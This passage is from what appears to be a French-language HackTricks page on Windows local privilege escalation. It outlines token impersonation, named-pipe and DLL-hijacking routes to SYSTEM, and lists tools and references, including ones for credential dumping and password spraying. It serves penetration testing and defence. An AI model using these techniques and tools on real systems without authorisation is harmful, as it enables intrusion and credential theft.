Avec cette technique, on **sélectionne généralement n'importe quel processus exécuté en tant que SYSTEM avec tous les privilèges du token** (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges du token_).\
**Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour effectuer une élévation dans `getsystem`. Elle consiste à **créer un pipe, puis à créer ou abuser d'un service pour écrire dans ce pipe**. Ensuite, le **serveur** qui a créé le pipe à l'aide du privilège **`SeImpersonate`** pourra **usurper le token** du client du pipe (le service) et obtenir les privilèges SYSTEM.\
Si vous souhaitez [**en savoir plus sur les name pipes, vous devriez lire ceci**](#named-pipe-client-impersonation).\
Si vous souhaitez consulter un exemple de [**passage de High Integrity à System à l'aide de name pipes, vous devriez lire ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **détourner une dll** **chargée** par un **processus** exécuté en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Le Dll Hijacking est donc également utile pour ce type d'élévation de privilèges et, de plus, il est **beaucoup plus facile à réaliser depuis un processus High Integrity**, car celui-ci disposera des **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Vous pouvez** [**en savoir plus sur le Dll hijacking ici**](dll-hijacking/index.html)**.**

### **D'Administrator ou Network Service à System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### De LOCAL SERVICE ou NETWORK SERVICE aux privilèges complets

**Lire :** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Plus d'aide

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Outils utiles

**Meilleur outil pour rechercher les vecteurs d'élévation de privilèges locale Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les mauvaises configurations et les fichiers sensibles (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines mauvaises configurations possibles et collecte des informations (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les mauvaises configurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrait les informations de session enregistrées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utilisez -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants de Credential Manager. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Effectue un spray des mots de passe collectés sur le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un outil PowerShell d'usurpation ADIDNS/LLMNR/mDNS et de man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération Windows de base pour la privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Recherche les vulnérabilités connues de privesc (DEPRECATED au profit de Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(Droits Admin requis)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche les vulnérabilités connues de privesc (doit être compilé avec VisualStudio) ([**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche de mauvaises configurations (davantage un outil de collecte d'informations qu'un outil de privesc) (doit être compilé) **(**[**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait les identifiants de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portage de PowerUp vers C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Vérifie les mauvaises configurations (exécutable précompilé sur github). Non recommandé. Il ne fonctionne pas correctement sous Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les mauvaises configurations possibles (exe issu de python). Non recommandé. Il ne fonctionne pas correctement sous Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé à partir de cet article (il n'a pas besoin d'accesschk pour fonctionner correctement, mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande les exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande les exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Vous devez compiler le projet avec la version correcte de .NET ([voir ceci](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour afficher la version installée de .NET sur l'hôte victime, vous pouvez exécuter :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Références

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: hameçonnage par macro VBA Word via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak de chaîne de format + BOF de pile → VirtualAlloc ROP (RCE) et vol de token du kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – À la poursuite du Silver Fox : jeu du chat et de la souris dans les ombres du kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnérabilité de système de fichiers privilégié présente dans un système SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Outils de test des liens symboliques – utilisation de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Un lien vers le passé. Abus des liens symboliques sous Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (portage Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls : résolution dangereuse des modules sous Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Modules Node.js : chargement depuis les dossiers `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json : `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - défis de la checklist C/C++, résolus](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - fonction RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
